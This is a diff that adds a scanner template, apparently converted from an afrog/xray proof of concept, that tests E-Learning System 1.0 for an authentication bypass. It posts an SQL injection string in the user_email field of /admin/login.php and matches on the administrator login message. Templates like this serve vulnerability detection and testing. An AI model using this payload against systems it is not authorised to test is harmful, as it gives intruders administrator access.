@@ -1,0 +1,27 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      user_email='or 1 or'&user_pass=lol&btnLogin=
+    headers:
+      Cookie: PHPSESSID=d794ba06fcba883d6e9aaf6e528b0733
+    matchers:
+      - type: word
+        part: body
+        words:
+          - You login as Administrator.
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/admin/login.php'
+id: e-learning-system-authentication-bypass-rce
+info:
+  author: daffainfo
+  description: E-Learning System 1.0-通过SQL注入+远程代码执行绕过身份验证
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: E-Learning System 1.0 - Authentication Bypass
+  severity: critical
+  tags: ecology,sqli,argus-import
